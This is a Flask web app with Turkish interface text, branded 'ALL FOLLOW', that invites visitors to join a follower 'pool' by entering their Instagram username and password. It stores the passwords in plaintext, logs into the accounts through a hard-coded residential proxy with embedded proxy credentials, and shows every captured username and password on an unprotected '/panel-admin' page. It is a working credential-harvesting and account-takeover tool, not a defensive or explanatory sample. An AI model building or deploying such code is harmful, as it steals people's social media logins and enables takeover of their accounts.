import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
# Sadece en temel ve değişmeyen hataları çekiyoruz
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
        <div style="background:#161b2c;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #2d334a;box-shadow:0 20px 40px rgba(0,0,0,0.4);">
            <h1 style="font-style:italic;letter-spacing:-1px;font-size:32px;margin-bottom:5px;color:#3b82f6;">ALL FOLLOW</h1>
            <p style="font-size:10px;color:#5c6b89;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">Final Stable v3.4</p>
            <input id="u" placeholder="Kullanıcı Adı" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
            <input id="p" type="password" placeholder="Şifre" style="width:100%;padding:14px;margin:8px 0;background:#0a0f1e;border:1px solid #2d334a;color:#fff;border-radius:12px;outline:none;">
            <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;">HAVUZA GİRİŞ YAP</button>
            <p id="m" style="font-size:13px;margin-top:20px;color:#94a3b8;"></p>
        </div>
        <script>
            async function login(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const b=document.getElementById('b'), m=document.getElementById('m');
                if(!u || !p) return;
                b.disabled=true; b.innerText="BAĞLANILIYOR..."; m.innerText="Tünel protokolleri aktif ediliyor...";
                try {
                    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                    const d=await r.json();
                    m.innerText=d.msg; b.disabled=false; b.innerText="TEKRAR DENE";
                    if(d.status==="success") { b.innerText="BAĞLANDI ✅"; b.style.background="#10b981"; }
                } catch(e) { m.innerText="Bağlantı kesildi."; b.disabled=false; }
            }
        </script>
    </body>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u').strip().lower(), data.get('p').strip()
    
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    cl = Client()
    cl.set_proxy(PROXY_URL)
    cl.request_timeout = 35

    try:
        # Direkt Giriş
        cl.login(u, p)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Başarıyla havuza katıldınız!")

    except ChallengeRequired:
        user.status = "Onay Gerekli ⚠️"
        db.session.commit()
        return jsonify(status="error", msg="Instagram onayı gerekiyor. Uygulamadan onay verin.")
    
    except BadPassword:
        user.status = "Hatalı Şifre ❌"
        db.session.commit()
        return jsonify(status="error", msg="Şifre yanlış.")

    except Exception as e:
        err = str(e).lower()
        
        # 'NotFound' hatasını manuel metin taramasıyla yakalıyoruz
        if "not found" in err:
            user.status = "Hesap Bulunamadı"
            db.session.commit()
            return jsonify(status="error", msg="Instagram hesabı bulamadı. Tekrar kontrol edin.")
            
        # JSON veya Expecting value hatası gelse bile eğer giriş yapıldıysa onaylıyoruz
        if "expecting value" in err or (hasattr(cl, 'user_id') and cl.user_id):
            user.status = "AKTİF ✅ (Oto-Onay)"
            db.session.commit()
            return jsonify(status="success", msg="Giriş başarıyla sağlandı!")

        user.status = f"Hata: {err[:30]}"
        db.session.commit()
        return jsonify(status="error", msg="Instagram şu an meşgul, lütfen biraz bekleyip tekrar deneyin.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Havuzu ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
